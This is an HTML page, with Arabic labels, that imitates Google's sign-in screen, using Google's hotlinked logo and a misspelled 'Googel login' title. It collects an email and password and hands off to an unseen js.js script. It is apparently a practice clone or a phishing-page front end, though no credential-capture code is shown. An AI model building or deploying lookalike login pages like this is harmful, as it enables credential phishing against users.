<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Googel login</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-wrapper {
      text-align: center;
    }

    .login-card {
      width: 360px;
      background: #fff;
      padding: 40px;
      border-radius: 8px;
      border: 1px solid #dadce0;
    }

    .logo {
      width: 75px;
      margin-bottom: 20px;
    }

    h2 {
      font-weight: normal;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 14px;
      color: #5f6368;
      margin-bottom: 30px;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      font-size: 14px;
    }

    .input-group input:focus {
      border-color: #1a73e8;
    }

    .input-group label {
      position: absolute;
      top: 12px;
      left: 12px;
      background: #fff;
      padding: 0 4px;
      font-size: 14px;
      color: #5f6368;
      transition: 0.2s;
      pointer-events: none;
    }

    .input-group input:focus + label,
    .input-group input:valid + label {
      top: -8px;
      left: 8px;
      font-size: 12px;
      color: #1a73e8;
    }

    .link {
      display: block;
      text-align: left;
      font-size: 13px;
      color: #1a73e8;
      text-decoration: none;
      margin-bottom: 25px;
    }

    .link:hover {
      text-decoration: underline;
    }

    .login-btn {
      width: 100%;
      padding: 10px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }

    .login-btn:hover {
      background: #1765cc;
    }

    .footer {
      margin-top: 20px;
    }

    .footer select {
      border: none;
      background: transparent;
      font-size: 13px;
      color: #5f6368;
    }
  </style>
</head>

<body>

  <div class="login-wrapper">
    
    <div class="login-card">
      <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">

      <h2>تسجيل الدخول</h2>
      <p class="subtitle">استخدام حسابك للمتابعة</p>

      <form>
        <div class="input-group">
          <input type="email" required>
          <label>البريد الإلكتروني أو الهاتف</label>
        </div>

        <div class="input-group">
          <input type="password" required>
          <label>كلمة المرور</label>
        </div>

        <a href="#" class="link">هل نسيت كلمة المرور؟</a>

        <button type="submit" class="login-btn">تسجيل الدخول</button>
      </form>
    </div>

    <div class="footer">
      <select>
        <option>العربية</option>
        <option>English</option>
      </select>
    </div>

  </div>
<script src="js.js"></script>
</body>
</html>
